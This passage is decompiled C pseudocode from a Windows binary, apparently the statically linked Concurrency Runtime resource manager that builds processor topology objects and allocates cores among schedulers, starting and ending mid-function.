      result = *(v9 - 2) - *v9;
      if ( result )
      {
        v10 = 0;
        v17 = 0;
        v20 = 0;
        result = 0;
        v11 = 0;
        v16 = 0;
        do
        {
          if ( v10 >= *(v9 - 8) )
            break;
          v12 = result + v9[3];
          if ( *(_DWORD *)v12 == 4 && !*(_DWORD *)(v12 + 40) && !*(_BYTE *)(v12 + 49) )
          {
            v13 = (_DWORD *)(v20 + *(_DWORD *)(this[18] + v18 + 32));
            v14 = v13[4];
            if ( v14 > 1 )
            {
              v13[4] = v14 - 1;
              if ( *(_BYTE *)(v12 + 48) )
                sub_4344ED(this, (int)(v9 - 9), v12, (_DWORD *)(v18 + this[18]), v13, a3);
              sub_43BCD2(a2, (int)(v9 - 9), v17);
              --v6;
            }
            v11 = v20;
            result = v16;
          }
          result += 52;
          v10 = v17 + 1;
          v16 = result;
          v11 += 36;
          ++v17;
          v20 = v11;
        }
        while ( v6 );
        v8 = v15;
      }
      v18 += 40;
      ++v8;
      v9 += 13;
      v15 = v8;
    }
    while ( v6 );
  }
  return result;
}
// 43286B: conditional instruction was optimized away because esi.4!=0

//----- (0043292A) --------------------------------------------------------
void __thiscall sub_43292A(_DWORD *this)
{
  unsigned int i; // esi
  int v3; // ebx
  unsigned int v4; // eax

  for ( i = 0; i < this[2]; ++i )
  {
    v3 = *(_DWORD *)(this[21] + 4 * i);
    if ( *(_BYTE *)(v3 + 33) == 1 )
    {
      v4 = sub_431117(*(_DWORD **)(v3 + 16));
      *(_DWORD *)(v3 + 36) = sub_43B266(*(_DWORD **)(v3 + 16), v4);
    }
  }
}

//----- (00432960) --------------------------------------------------------
char __thiscall sub_432960(int this, int a2, int a3, char a4)
{
  _DWORD *v5; // eax
  char result; // al

  v5 = operator new(8u);
  if ( v5 )
  {
    *v5 = &Concurrency::details::GlobalCore::TopologyObject::`vftable';
    v5[1] = this;
  }
  else
  {
    v5 = 0;
  }
  *(_DWORD *)(this + 32) = v5;
  *(_DWORD *)(this + 12) = a2;
  *(_DWORD *)(this + 4) = a3;
  result = a4;
  *(_BYTE *)(this + 8) = a4;
  return result;
}
// 470F18: using guessed type void *Concurrency::details::GlobalCore::TopologyObject::`vftable';

//----- (0043299D) --------------------------------------------------------
unsigned int __thiscall sub_43299D(
        unsigned int *this,
        unsigned int a2,
        unsigned __int16 a3,
        unsigned __int16 a4,
        unsigned int a5,
        unsigned int a6,
        char a7)
{
  _DWORD *v8; // eax
  int v9; // ebx
  signed int v10; // ecx
  unsigned __int16 v11; // dx
  unsigned int v12; // eax
  unsigned int v13; // edi
  int v14; // ecx
  unsigned int *v15; // eax
  void *v16; // ecx
  size_t v17; // eax
  unsigned int result; // eax
  unsigned int v19; // edx
  int v20; // edi
  unsigned int v21; // ecx
  int v22; // eax
  int v23; // ecx
  char v24; // [esp-4h] [ebp-1Ch]
  unsigned int v25; // [esp+10h] [ebp-8h]
  unsigned int v26; // [esp+14h] [ebp-4h]

  v8 = operator new(8u);
  v9 = 0;
  if ( v8 )
  {
    *v8 = &Concurrency::details::GlobalNode::TopologyObject::`vftable';
    v8[1] = this;
  }
  else
  {
    v8 = 0;
  }
  this[9] = (unsigned int)v8;
  this[6] = a2;
  this[4] = a3;
  this[3] = a4;
  v26 = a5;
  *this = a5;
  if ( a6 )
  {
    v12 = a6;
  }
  else
  {
    v10 = a5;
    v11 = 0;
    if ( a5 )
    {
      do
      {
        ++v11;
        v10 &= v10 - 1;
      }
      while ( v10 );
    }
    v12 = v11;
  }
  this[1] = v12;
  v13 = v12;
  this[2] = 0;
  v14 = (36 * (unsigned __int64)v12) >> 32 != 0 ? -1 : 36 * v12;
  v15 = (unsigned int *)unknown_libname_45(__CFADD__(v14, 4) ? -1 : v14 + 4);
  if ( v15 )
  {
    *v15 = v13;
    v16 = v15 + 1;
  }
  else
  {
    v16 = 0;
  }
  v17 = 36 * this[1];
  this[8] = (unsigned int)v16;
  result = (unsigned int)memset(v16, 0, v17);
  v19 = 0;
  if ( this[1] )
  {
    result = a5;
    v20 = 0;
    v21 = a6;
    while ( !v21 )
    {
      if ( (result & 1) != 0 )
      {
        v22 = this[3];
        v24 = v9;
LABEL_18:
        v23 = v20 + this[8];
        v20 += 36;
        v25 = v19 + 1;
        sub_432960(v23, (int)this, v9 + (v22 << 8), v24);
        v21 = a6;
        v19 = v25;
        result = v26;
      }
      result >>= 1;
      ++v9;
      v26 = result;
      if ( v19 >= this[1] )
        return result;
    }
    v24 = v9 + a7;
    v22 = a3 + (this[3] << 8);
    goto LABEL_18;
  }
  return result;
}
// 42D1CA: using guessed type int __cdecl unknown_libname_45(_DWORD);
// 470F24: using guessed type void *Concurrency::details::GlobalNode::TopologyObject::`vftable';

//----- (00432AB0) --------------------------------------------------------
void *__thiscall sub_432AB0(int this)
{
  unsigned int v2; // eax
  void *result; // eax
  void *v4; // [esp-8h] [ebp-10h]

  v2 = *(_DWORD *)(this + 12);
  if ( v2 < *(_DWORD *)(this + 8) )
  {
    do
      v2 *= 2;
    while ( v2 < *(_DWORD *)(this + 8) );
    v4 = *(void **)(this + 84);
    *(_DWORD *)(this + 12) = v2;
    j_j_j___free_base(v4);
    j_j_j___free_base(*(void **)(this + 88));
    j_j_j___free_base(*(void **)(this + 92));
    *(_DWORD *)(this + 84) = unknown_libname_45(
                               (unsigned __int64)*(unsigned int *)(this + 12) >> 30 != 0
                             ? -1
                             : 4 * *(_DWORD *)(this + 12));
    if ( *(_DWORD *)(this + 88) )
    {
      *(_DWORD *)(this + 88) = unknown_libname_45(
                                 (unsigned __int64)*(unsigned int *)(this + 12) >> 30 != 0
                               ? -1
                               : 4 * *(_DWORD *)(this + 12));
      *(_DWORD *)(this + 92) = unknown_libname_45(
                                 (unsigned __int64)*(unsigned int *)(this + 12) >> 30 != 0
                               ? -1
                               : 4 * *(_DWORD *)(this + 12));
    }
  }
  result = memset(*(void **)(this + 84), 0, 4 * *(_DWORD *)(this + 8));
  if ( *(_DWORD *)(this + 88) )
  {
    memset(*(void **)(this + 88), 0, 4 * *(_DWORD *)(this + 8));
    return memset(*(void **)(this + 92), 0, 4 * *(_DWORD *)(this + 8));
  }
  return result;
}
// 42D1CA: using guessed type int __cdecl unknown_libname_45(_DWORD);

//----- (00432B72) --------------------------------------------------------
void __cdecl sub_432B72(char a1)
{
  int v1; // eax
  int v2; // ecx
  char *v3; // edi
  int v4; // esi
  unsigned int v5; // ecx
  unsigned int v6; // edx
  int v7; // eax
  unsigned int v8; // ecx
  unsigned __int8 v9; // dl
  char *v10; // esi
  int v11; // ecx
  unsigned __int16 i; // dx
  int *v13; // esi
  unsigned int v14; // edi
  int v15; // eax
  int v16; // eax
  int v17; // ecx
  unsigned __int16 j; // dx
  ULONG_PTR v19; // ecx
  unsigned __int16 k; // dx
  char *v21; // [esp+0h] [ebp-18h]
  int *v22; // [esp+0h] [ebp-18h]
  int v23; // [esp+4h] [ebp-14h]
  int v24; // [esp+8h] [ebp-10h]
  int v25; // [esp+8h] [ebp-10h]
  unsigned int v26; // [esp+Ch] [ebp-Ch]
  unsigned int v27; // [esp+10h] [ebp-8h]
  unsigned int v28; // [esp+10h] [ebp-8h]
  unsigned __int8 v29; // [esp+17h] [ebp-1h]

  v1 = dword_4927DC;
  if ( !dword_4927DC )
  {
    sub_433E72();
    v1 = dword_4927DC;
  }
  v2 = dword_4927C4;
  if ( !dword_4927C4 )
  {
    sub_430B83();
    v1 = dword_4927DC;
    v2 = dword_4927C4;
  }
  if ( v1 >= 4 )
  {
    sub_4326A6(0xFFFF);
    v3 = (char *)Block;
    v4 = 0;
    v24 = 0;
    v21 = (char *)Block + ReturnedLength;
    v5 = 0;
    v27 = 0;
    v6 = 0;
    v26 = 0;
    if ( Block < (char *)Block + ReturnedLength )
    {
      while ( *(_DWORD *)v3 )
      {
        if ( *(_DWORD *)v3 != 1 )
        {
          if ( *(_DWORD *)v3 == 3 )
          {
            v29 = 0;
            LOWORD(v7) = 0;
            v8 = v27;
            v9 = 0;
            v23 = 0;
            if ( *((_WORD *)v3 + 15) )
            {
              do
              {
                v10 = &v3[12 * (unsigned __int16)v7 + 32];
                sub_430B4A(v10);
                v9 = (*(_DWORD *)v10 != 0) | v29;
                v7 = v23 + 1;
                v29 = v9;
                v23 = v7;
              }
              while ( (unsigned __int16)v7 < *((_WORD *)v3 + 15) );
              v8 = v27;
              v4 = v24;
            }
            v5 = v9 + v8;
            v27 = v5;
          }
LABEL_18:
          v6 = v26;
          goto LABEL_19;
        }
        sub_430B4A((_DWORD *)v3 + 8);
        v4 = v24;
        v5 = v27;
        v6 = (*((_DWORD *)v3 + 8) != 0) + v26;
        v26 = v6;
LABEL_19:
        v3 += *((_DWORD *)v3 + 1);
        if ( v3 >= v21 )
          goto LABEL_20;
      }
      sub_430B4A((_DWORD *)v3 + 8);
      v11 = *((_DWORD *)v3 + 8);
      for ( i = 0; v11; v11 &= v11 - 1 )
        ++i;
      v5 = v27;
      v4 = i + v24;
      v24 = v4;
      goto LABEL_18;
    }
LABEL_20:
    byte_4927D0 = v5 > v6;
    if ( v5 <= v6 )
      v5 = v6;
    dword_4927CC = v4;
    dword_4927D8 = v6;
    goto LABEL_39;
  }
  if ( v1 == 3 )
  {
    sub_4326A6(0xFFFF);
    v13 = (int *)Block;
    v14 = 0;
    v5 = 0;
    v25 = 0;
    v28 = 0;
    v22 = (int *)((char *)Block + 24 * (ReturnedLength / 0x18));
    if ( Block < v22 )
    {
      do
      {
        v15 = v13[1];
        if ( v15 )
        {
          v16 = v15 - 1;
          if ( v16 )
          {
            if ( v16 == 2 )
            {
              sub_430B1F(v13);
              v5 = v28;
              if ( *v13 )
                v5 = ++v28;
            }
          }
          else
          {
            sub_430B1F(v13);
            v5 = v28;
            if ( *v13 )
              ++v14;
          }
        }
        else
        {
          sub_430B1F(v13);
          v17 = *v13;
          for ( j = 0; v17; v17 &= v17 - 1 )
            ++j;
          v5 = v28;
          v25 += j;
        }
        v13 += 6;
      }
      while ( v13 < v22 );
    }
    byte_4927D0 = v5 > v14;
    if ( v5 <= v14 )
      v5 = v14;
    dword_4927CC = v25;
    dword_4927D8 = v14;
LABEL_39:
    dword_4927D4 = v5;
    if ( !a1 )
      sub_430CA8();
    goto LABEL_47;
  }
  dword_4927D4 = 1;
  byte_4927D0 = 0;
  if ( v2 )
  {
    sub_430B83();
    v19 = ProcessAffinityMask & *(_DWORD *)sub_4323F9((_DWORD *)dword_4927C4, 0);
  }
  else
  {
    v19 = ProcessAffinityMask;
  }
  for ( k = 0; v19; v19 &= v19 - 1 )
    ++k;
  dword_4927CC = k;
  dword_4927D8 = 1;
LABEL_47:
  if ( dword_4927C8 )
    sub_4309CA((void **)dword_4927C8, 1);
  dword_4927C8 = 0;
}
// 4927C4: using guessed type int dword_4927C4;
// 4927CC: using guessed type int dword_4927CC;
// 4927D0: using guessed type char byte_4927D0;
// 4927D4: using guessed type int dword_4927D4;
// 4927D8: using guessed type int dword_4927D8;
// 4927DC: using guessed type int dword_4927DC;

//----- (00432E07) --------------------------------------------------------
unsigned int __thiscall sub_432E07(_DWORD *this)
{
  unsigned int result; // eax
  unsigned int v2; // ecx

  result = this[43] - this[46];
  v2 = this[33];
  if ( result <= v2 )
    return v2;
  return result;
}

//----- (00432E20) --------------------------------------------------------
_DWORD *__thiscall sub_432E20(unsigned int *this, _DWORD *a2, int a3, char a4)
{
  unsigned int v5; // ebx
  unsigned int v6; // ecx
  BOOL v7; // eax
  _DWORD *v8; // ebx
  unsigned int v10; // [esp+Ch] [ebp-14h]
  unsigned int v11; // [esp+10h] [ebp-10h]
  unsigned int v12; // [esp+14h] [ebp-Ch]
  unsigned int v13; // [esp+18h] [ebp-8h]
  char v14; // [esp+1Fh] [ebp-1h]

  if ( (_BYTE)a3 )
    a2[4] = sub_430E20(this);
  v5 = 0;
  v10 = a2[40];
  if ( a4 )
  {
    v11 = sub_430DF3(a2);
    v6 = sub_430DD0(a2);
    v13 = v6;
    if ( (_BYTE)a3 )
    {
      v7 = v11;
    }
    else
    {
      v6 = a2[46] + sub_432E07(a2) < this[7];
      v13 = v6;
      v7 = v10 < v11;
    }
    v12 = v7;
  }
  else
  {
    v11 = a2[46] + sub_432E07(a2);
    v12 = v11;
    v6 = sub_431117(a2);
    v13 = v6;
  }
  v14 = 0;
  if ( v6 )
  {
    sub_434303(this, (int)a2, a4);
    sub_433226(this);
    v5 = sub_433C40(this, (int)a2, v13, 0);
    if ( v5 < v13 && ((_BYTE)a3 || v12) )
    {
      v14 = 1;
      v5 += sub_43390B(this, (int)a2, v13 - v5, -2);
      if ( v5 < v13 )
      {
        v5 += sub_433467(this, (int)a2, v5 + v10, v11, v10 + v13);
        if ( v5 < v12 )
        {
          v5 += sub_43390B(this, (int)a2, v12 - v5, -1);
          if ( v5 < v12 )
            v5 += sub_433C0C(this, (int)a2, v12 - v5);
        }
      }
    }
    sub_433E1B(this);
  }
  v8 = sub_43B816((int)a2, v5, a3, a4);
  if ( v14 )
    sub_430CC3(this, (int)a2);
  return v8;
}

//----- (00432F76) --------------------------------------------------------
int __thiscall sub_432F76(_DWORD *this, int a2, int a3, int a4)
{
  int result; // eax
  int v5; // esi
  unsigned int v6; // ebx
  _DWORD *v7; // esi
  unsigned int v8; // ecx
  int v9; // edx
  bool v10; // zf
  int v11; // [esp+8h] [ebp-18h]
  unsigned int v12; // [esp+Ch] [ebp-14h]
  _DWORD *v13; // [esp+10h] [ebp-10h]
  int v14; // [esp+14h] [ebp-Ch]
  int v15; // [esp+18h] [ebp-8h]
  unsigned int v16; // [esp+1Ch] [ebp-4h]

  v13 = this;
  *(_DWORD *)a4 = a2;
  result = a3;
  *(double *)(a4 + 8) = 0.0;
  *(_DWORD *)(a4 + 16) = a3;
  v5 = *(_DWORD *)(a3 + 16);
  if ( v5 )
  {
    v6 = 0;
    v12 = 0;
    if ( this[6] )
    {
      result = 0;
      v7 = (_DWORD *)(v5 + 44);
      v11 = 0;
      do
      {
        *(v7 - 1) = 0;
        *v7 = 0;
        if ( *(v7 - 4) )
        {
          v16 = 0;
          if ( *(v7 - 10) )
          {
            v8 = 0;
            v14 = 0;
            v15 = 0;
            do
            {
              v9 = v15 + v7[1];
              v10 = *(_DWORD *)v9 == 4;
              *(_BYTE *)(v9 + 48) = 0;
              if ( v10 && !*(_DWORD *)(v9 + 24) )
              {
                sub_4344ED(
                  v13,
                  (int)(v7 - 11),
                  v9,
                  (_DWORD *)(result + v13[18]),
                  (_DWORD *)(v14 + *(_DWORD *)(result + v13[18] + 32)),
                  (_DWORD *)a4);
                result = v11;
                v8 = v16;
              }
              v15 += 52;
              ++v8;
              v14 += 36;
              v16 = v8;
            }
            while ( v8 < *(v7 - 10) );
            v6 = v12;
            this = v13;
          }
        }
        ++v6;
        result += 40;
        v7 += 13;
        v12 = v6;
        v11 = result;
      }
      while ( v6 < this[6] );
    }
  }
  return result;
}

//----- (0043303C) --------------------------------------------------------
_DWORD *__thiscall sub_43303C(_DWORD *this)
{
  _DWORD *v1; // esi
  int v2; // edi
  _DWORD *result; // eax
  int v4; // ebx
  int v5; // ebx
  int v6; // edi
  unsigned int v7; // eax
  unsigned int v8; // eax
  unsigned int v9; // edi
  char v10; // al
  unsigned int v12; // [esp+10h] [ebp-14h]
  int v13; // [esp+14h] [ebp-10h]
  unsigned int v14; // [esp+18h] [ebp-Ch] BYREF
  int v15; // [esp+1Ch] [ebp-8h] BYREF
  unsigned int v16; // [esp+20h] [ebp-4h] BYREF

  v1 = this;
  v2 = 0;
  v13 = 0;
  result = sub_432AB0((int)this);
  v4 = v1[25];
  if ( v4 )
  {
    v5 = *(_DWORD *)(v4 + 24);
    if ( v5 )
    {
      while ( 1 )
      {
        memset((void *)(v5 + 64), 0, 0x38u);
        sub_432F76(v1, v2, v5, v5 + 64);
        v12 = *(_DWORD *)(v5 + 160);
        if ( *(_BYTE *)(v5 + 204) )
        {
          v6 = *(_DWORD *)(v5 + 8);
          v7 = *(_DWORD *)(v5 + 120);
          v14 = 0;
          v15 = 0;
          v16 = v7;
          (*(void (__thiscall **)(int, unsigned int *, int *, unsigned int *))(*(_DWORD *)v6 + 4))(v6, &v14, &v15, &v16);
          v8 = sub_43AB98(*(_DWORD *)(v5 + 56), v12, v14, v15, v16);
          *(_DWORD *)(v5 + 100) = v8;
          if ( v8 > *(_DWORD *)(v5 + 160) )
            *(_DWORD *)(v5 + 100) = sub_43B266((_DWORD *)v5, v8);
          v1 = this;
          *(_DWORD *)(v5 + 120) = v16;
        }
        else
        {
          *(_DWORD *)(v5 + 100) = *(_DWORD *)(v5 + 160);
        }
        v9 = *(_DWORD *)(v5 + 160);
        if ( v9 )
        {
          if ( *(_DWORD *)(v5 + 84) || v9 > *(_DWORD *)(v5 + 100) )
          {
LABEL_11:
            v10 = 0;
            goto LABEL_12;
          }
        }
        else if ( !*(_DWORD *)(v5 + 196) )
        {
          goto LABEL_11;
        }
        if ( v9 >= sub_431117((_DWORD *)v5) )
          goto LABEL_11;
        v10 = 1;
LABEL_12:
        *(_BYTE *)(v5 + 97) = v10;
        result = (_DWORD *)v1[21];
        result[v13] = v5 + 64;
        v2 = ++v13;
        if ( v5 != v1[25] )
        {
          result = *(_DWORD **)(v5 + 24);
          v5 = (int)result;
          if ( result )
            continue;
        }
        return result;
      }
    }
  }
  return result;
}

//----- (00433158) --------------------------------------------------------
void __thiscall sub_433158(_DWORD *this)
{
  unsigned int v2; // ecx
  int v3; // eax
  _DWORD *v4; // edi
  int v5; // esi
  unsigned int v6; // ebx
  unsigned int v7; // eax
  unsigned int i; // [esp+8h] [ebp-8h]
  _DWORD *v9; // [esp+Ch] [ebp-4h]

  v2 = 0;
  v9 = this;
  for ( i = 0; v2 < this[2]; i = v2 )
  {
    v3 = this[21];
    v4 = *(_DWORD **)(v3 + 4 * v2);
    v5 = v4[4];
    if ( *(_DWORD *)(v5 + 168) )
      sub_4326CF(this, (_DWORD *)v5, *(_DWORD **)(v3 + 4 * v2));
    if ( v4[5] )
    {
      v6 = *(_DWORD *)(v5 + 160) - v4[5];
      if ( v4[9] > v6 )
      {
        if ( *(_DWORD *)(v5 + 184) + sub_432E07((_DWORD *)v5) > v6 )
          v6 = *(_DWORD *)(v5 + 184) + sub_432E07((_DWORD *)v5);
        v4[9] = v6;
      }
      this = v9;
    }
    if ( v4[9] < *(_DWORD *)(v5 + 160)
      && *(_DWORD *)(v5 + 160) - *(_DWORD *)(v5 + 168) > *(_DWORD *)(v5 + 184) + sub_432E07((_DWORD *)v5) )
    {
      sub_4327E9(this, (_DWORD *)v5, v4);
    }
    if ( !*(_BYTE *)(v5 + 204) )
    {
      v7 = *(_DWORD *)(v5 + 160);
      if ( v4[9] > v7 )
        v4[9] = v7;
    }
    v2 = i + 1;
  }
}

//----- (00433226) --------------------------------------------------------
unsigned int __thiscall sub_433226(_DWORD *this)
{
  unsigned int i; // esi
  unsigned int result; // eax
  _DWORD *v4; // ecx

  for ( i = 0; i < this[2]; ++i )
  {
    result = *(_DWORD *)(this[21] + 4 * i);
    v4 = *(_DWORD **)(result + 16);
    if ( v4[42] )
      result = sub_4326CF(this, v4, *(_DWORD **)(this[21] + 4 * i));
  }
  return result;
}

//----- (00433255) --------------------------------------------------------
unsigned int __thiscall sub_433255(_DWORD *this, unsigned int a2)
{
  unsigned int v2; // esi
  unsigned int v4; // ecx
  int v5; // edx
  int v6; // ebx
  int v7; // eax
  unsigned int v8; // ecx
  int v9; // eax
  unsigned int v10; // ebx
  _DWORD *v11; // edx
  int v12; // eax
  int v13; // edx
  int v14; // ebx
  unsigned int v15; // ebx
  unsigned int v16; // edx
  int v17; // ebx
  unsigned int v18; // eax
  int v19; // ecx
  int v20; // edx
  int v21; // ecx
  int v22; // eax
  int v23; // edx
  int v24; // eax
  unsigned int v25; // edx
  int v26; // esi
  unsigned int v27; // eax
  unsigned int v28; // ecx
  int v29; // ebx
  unsigned int v30; // edi
  int v31; // edx
  unsigned int v32; // eax
  unsigned int v33; // eax
  bool v34; // zf
  unsigned int j; // [esp+Ch] [ebp-2Ch]
  unsigned int v37; // [esp+10h] [ebp-28h]
  int v38; // [esp+14h] [ebp-24h]
  unsigned int v39; // [esp+18h] [ebp-20h]
  unsigned int v40; // [esp+20h] [ebp-18h]
  unsigned int v41; // [esp+24h] [ebp-14h]
  _DWORD *i; // [esp+28h] [ebp-10h]
  unsigned int v43; // [esp+2Ch] [ebp-Ch]
  int v44; // [esp+30h] [ebp-8h]
  int v45; // [esp+30h] [ebp-8h]
  unsigned int v46; // [esp+30h] [ebp-8h]
  unsigned int v47; // [esp+34h] [ebp-4h]
  int v48; // [esp+34h] [ebp-4h]

  v2 = a2;
  v4 = 0;
  for ( i = this; v4 < v2; *(_BYTE *)(v7 + 32) = 1 )
  {
    do
    {
      v5 = this[23];
      v6 = *(_DWORD *)(v5 + 4 * v4);
      if ( *(_DWORD *)(v6 + 4) )
        break;
      --v2;
      *(_DWORD *)(v5 + 4 * v4) = *(_DWORD *)(v5 + 4 * v2);
      *(_DWORD *)(this[23] + 4 * v2) = v6;
    }
    while ( v4 < v2 );
    a2 = v2;
    *(_DWORD *)(*(_DWORD *)(this[23] + 4 * v4) + 40) = 0;
    *(_DWORD *)(*(_DWORD *)(this[23] + 4 * v4) + 44) = 0;
    v7 = *(_DWORD *)(this[23] + 4 * v4++);
  }
  v8 = 0;
  for ( j = v2; v8 < v2; ++v8 )
  {
    do
    {
      v9 = *(_DWORD *)(this[23] + 4 * v8);
      if ( *(_DWORD *)(v9 + 40) )
        break;
      v10 = 0;
      if ( this[6] )
      {
        v11 = (_DWORD *)(*(_DWORD *)(*(_DWORD *)(v9 + 16) + 16) + 28);
        do
        {
          if ( *v11 && *v11 < *(v11 - 6) )
          {
            v12 = *(_DWORD *)(this[23] + 4 * v8);
            ++*(_DWORD *)(v12 + 40);
          }
          ++v10;
          v11 += 13;
        }
        while ( v10 < this[6] );
      }
      v13 = this[23];
      v14 = *(_DWORD *)(v13 + 4 * v8);
      if ( !*(_DWORD *)(v14 + 40) )
      {
        --v2;
        *(_DWORD *)(v13 + 4 * v8) = *(_DWORD *)(v13 + 4 * v2);
        *(_DWORD *)(this[23] + 4 * v2) = v14;
      }
    }
    while ( v8 < v2 );
    a2 = v2;
  }
  v15 = 0;
  v43 = 0;
  if ( v2 )
  {
    v44 = this[23];
    do
    {
      v47 = v15;
      v37 = v15 + 1;
      v16 = v15 + 1;
      if ( v15 + 1 < v2 )
      {
        v17 = 4 * v15;
        do
        {
          if ( *(_DWORD *)(*(_DWORD *)(v44 + 4 * v16) + 40) >= *(_DWORD *)(*(_DWORD *)(v17 + v44) + 40) )
          {
            v18 = v47;
          }
          else
          {
            v18 = v16;
            v47 = v16;
            v17 = 4 * v16;
          }
          ++v16;
        }
        while ( v16 < v2 );
        v15 = v43;
        this = i;
        if ( v43 != v18 )
        {
          v19 = i[23];
          v20 = *(_DWORD *)(v19 + 4 * v43);
          *(_DWORD *)(v19 + 4 * v43) = *(_DWORD *)(v19 + 4 * v18);
          *(_DWORD *)(i[23] + 4 * v47) = v20;
        }
      }
      v44 = this[23];
      v21 = *(_DWORD *)(v44 + 4 * v15);
      v22 = *(_DWORD *)(v21 + 16);
      v23 = *(_DWORD *)(v22 + 16);
      v24 = *(_DWORD *)(v22 + 20);
      v48 = v23;
      v25 = 0;
      v40 = 0;
      if ( *(_DWORD *)(v21 + 40) )
      {
        v26 = v24;
        do
        {
          v38 = *(_DWORD *)(v26 + 4 * v25);
          v39 = this[6];
          v27 = v25 + 1;
          v28 = v25 + 1;
          v41 = v25 + 1;
          if ( v25 + 1 < v39 )
          {
            v29 = v48 + 52 * v38;
            v30 = v25;
            v31 = v48;
            do
            {
              v45 = v31 + 52 * *(_DWORD *)(v26 + 4 * v28);
              v32 = *(_DWORD *)(v45 + 28);
              if ( v32 )
              {
                if ( v32 < *(_DWORD *)(v45 + 4) )
                {
                  v33 = *(_DWORD *)(v29 + 28);
                  if ( !v33 || v33 >= *(_DWORD *)(v29 + 4) || *(_DWORD *)(v45 + 28) > v33 )
                  {
                    v29 = v31 + 52 * *(_DWORD *)(v26 + 4 * v28);
                    v30 = v28;
                  }
                }
                v31 = v48;
              }
              ++v28;
            }
            while ( v28 < v39 );
            v34 = v40 == v30;
            v15 = v43;
            v46 = v30;
            this = i;
            if ( !v34 )
            {
              *(_DWORD *)(v26 + 4 * v40) = *(_DWORD *)(v26 + 4 * v46);
              *(_DWORD *)(v26 + 4 * v46) = v38;
            }
            v27 = v41;
          }
          v25 = v27;
          v44 = this[23];
          v40 = v27;
        }
        while ( v27 < *(_DWORD *)(*(_DWORD *)(v44 + 4 * v15) + 40) );
        v2 = a2;
      }
      v15 = v37;
      v43 = v37;
    }
    while ( v37 < v2 );
  }
  return j;
}
// 43326E: conditional instruction was optimized away because %arg_0.4!=0
// 4332BE: conditional instruction was optimized away because esi.4!=0

//----- (00433467) --------------------------------------------------------
unsigned int __thiscall sub_433467(_DWORD *this, int a2, unsigned int a3, unsigned int a4, unsigned int a5)
{
  unsigned int v6; // ecx
  int v7; // esi
  unsigned int v8; // edi
  unsigned int v10; // eax
  _DWORD *v11; // ecx
  unsigned int v12; // eax
  unsigned int v13; // ebx
  int v14; // eax
  int v15; // esi
  int v16; // ecx
  double v17; // st7
  _DWORD *v18; // edi
  unsigned int v19; // esi
  double v20; // st6
  double v21; // st7
  unsigned int v22; // ecx
  int v23; // eax
  unsigned int v24; // ecx
  int v25; // eax
  unsigned int v26; // edx
  int v27; // eax
  double v28; // st7
  double v29; // st6
  double v30; // st6
  char v31; // al
  unsigned int v32; // eax
  double v33; // st7
  char v34; // cl
  double v35; // st7
  double v36; // st6
  double v37; // st6
  unsigned int v38; // eax
  _DWORD *v39; // eax
  double v40; // st7
  char v41; // cl
  double v42; // st7
  double v43; // st6
  int v44; // eax
  _DWORD *v45; // edx
  int v46; // ecx
  double v48; // [esp+4h] [ebp-44h]
  double v49; // [esp+Ch] [ebp-3Ch]
  double v50; // [esp+14h] [ebp-34h]
  int v51; // [esp+20h] [ebp-28h]
  unsigned int v52; // [esp+24h] [ebp-24h]
  _DWORD *v53; // [esp+2Ch] [ebp-1Ch]
  unsigned int v54; // [esp+2Ch] [ebp-1Ch]
  int v55; // [esp+2Ch] [ebp-1Ch]
  _DWORD *v56; // [esp+2Ch] [ebp-1Ch]
  unsigned int v57; // [esp+2Ch] [ebp-1Ch]
  unsigned int v58; // [esp+30h] [ebp-18h]
  int v59; // [esp+30h] [ebp-18h]
  unsigned int v60; // [esp+34h] [ebp-14h]
  unsigned int v61; // [esp+34h] [ebp-14h]
  unsigned int v62; // [esp+34h] [ebp-14h]
  int v63; // [esp+34h] [ebp-14h]
  char *Block; // [esp+38h] [ebp-10h]
  _DWORD *Blocka; // [esp+38h] [ebp-10h]
  unsigned int v67; // [esp+40h] [ebp-8h]
  char v68; // [esp+47h] [ebp-1h]
  unsigned int v69; // [esp+58h] [ebp+10h]

  v52 = 0;
  v6 = this[2];
  if ( v6 > 1 )
  {
    v7 = this[21] + 4;
    v67 = a3;
    v8 = 1;
    v60 = v6 - 1;
    do
    {
      v53 = *(_DWORD **)(*(_DWORD *)v7 + 16);
      Block = (char *)v53[46];
      v10 = sub_432E07(v53);
      v11 = v53;
      v54 = v53[40] - v53[42];
      if ( v54 <= (unsigned int)&Block[v10] )
      {
        v12 = v67;
      }
      else
      {
        ++v8;
        a4 += (unsigned int)&Block[sub_432E07(v11)];
        v12 = v54 + v67;
        v67 += v54;
      }
      v7 += 4;
      --v60;
    }
    while ( v60 );
    v69 = a4;
    v13 = 1;
    v61 = v8;
    if ( v8 > 1 && v69 <= v12 )
    {
      v14 = unknown_libname_45((unsigned __int64)v8 >> 30 != 0 ? -1 : 4 * v8);
      v15 = v14;
      Blocka = (_DWORD *)v14;
      v16 = *(_DWORD *)this[21];
      *(_DWORD *)v14 = v16;
      *(double *)(v16 + 32) = (double)a5;
      v17 = *(double *)(*(_DWORD *)v14 + 32) + 0.0;
      v50 = v17;
      if ( this[2] > 1u )
      {
        v18 = (_DWORD *)(v14 + 4);
        v19 = 1;
        do
        {
          v55 = *(_DWORD *)(*(_DWORD *)(this[21] + 4 * v19) + 16);
          if ( *(_DWORD *)(v55 + 160) - *(_DWORD *)(v55 + 168) <= *(_DWORD *)(v55 + 184) + sub_432E07((_DWORD *)v55) )
          {
            v17 = v50;
          }
          else
          {
            *v18++ = v55 + 64;
            v17 = *(double *)(v55 + 96) + v50;
            v50 = v17;
          }
          ++v19;
        }
        while ( v19 < this[2] );
        v15 = (int)Blocka;
        v8 = v61;
        v13 = 1;
      }
      v20 = (double)v67;
      v49 = v20;
      while ( 1 )
      {
        v21 = v20 / v17;
        v22 = 0;
        v48 = v21;
        do
        {
          v23 = *(_DWORD *)(v15 + 4 * v22++);
          *(double *)(v23 + 8) = *(double *)(v23 + 32) * v21;
        }
        while ( v22 < v8 );
        sub_433F60(v15, v8);
        v68 = 0;
        v24 = 1;
        do
        {
          v25 = *(_DWORD *)(*(_DWORD *)(v15 + 4 * v24) + 16);
          v26 = *(_DWORD *)(v25 + 160) - *(_DWORD *)(v25 + 168);
          v27 = *(_DWORD *)(v15 + 4 * v24);
          v15 = (int)Blocka;
          if ( *(_DWORD *)(v27 + 4) <= v26 )
          {
            v17 = v50;
            v31 = v68;
          }
          else
          {
            v28 = (double)v26 / (double)*(unsigned int *)(v27 + 4);
            v29 = *(double *)(v27 + 32);
            v50 = v50 - (1.0 - v28) * v29;
            v30 = v28 * v29;
            v17 = v50;
            *(double *)(v27 + 32) = v30;
            v31 = 1;
            v68 = 1;
          }
          ++v24;
        }
        while ( v24 < v8 );
        v20 = v49;
        if ( !v31 )
        {
          v32 = 0;
